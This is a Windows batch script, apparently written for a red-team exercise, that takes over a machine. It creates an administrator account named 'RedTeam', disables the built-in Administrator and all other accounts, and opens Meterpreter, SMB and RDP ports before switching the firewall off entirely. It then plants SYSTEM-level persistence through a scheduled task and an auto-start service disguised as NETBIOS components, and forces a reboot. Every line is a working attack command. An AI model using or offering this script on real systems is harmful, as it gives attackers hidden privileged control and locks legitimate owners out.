net user RedTeam no3ntry /add
net localgroup Administrators RedTeam /add
net user Administrator /active:no
netsh advfirewall firewall add rule name=’Meterpreter’ dir=in action=allow protocol=Tcp localport=4444
netsh advfirewall firewall add rule name=’SMB’ dir=in action=allow protocol=Tcp localport=445
netsh advfirewall firewall add rule name=’RDP’ dir=in action=allow protocol=Tcp localport=3389
netsh firewall add portopening tcp 3389 RDP"
netsh firewall add portopening tcp 445 SMB"
netsh firewall set opmode disable enable"
netsh advfirewall set allprofiles state off"
schtasks /create /sc minute /mo 1 /tn "TCP/IP OVER NETBIOSv2" /tr "C:/Windows/System32/chickenlittle.bat" /ru SYSTEM
sc create NETBIOSv2 DisplayName="NETBIOS over TCPv2" start= auto binpath="C:/Windows/System32/chickenlittle.bat"
wmic useraccount where name!='RedTeam' set disabled=true
echo "Created by Shirley C. and Steven B."
shutdown /r /t 120
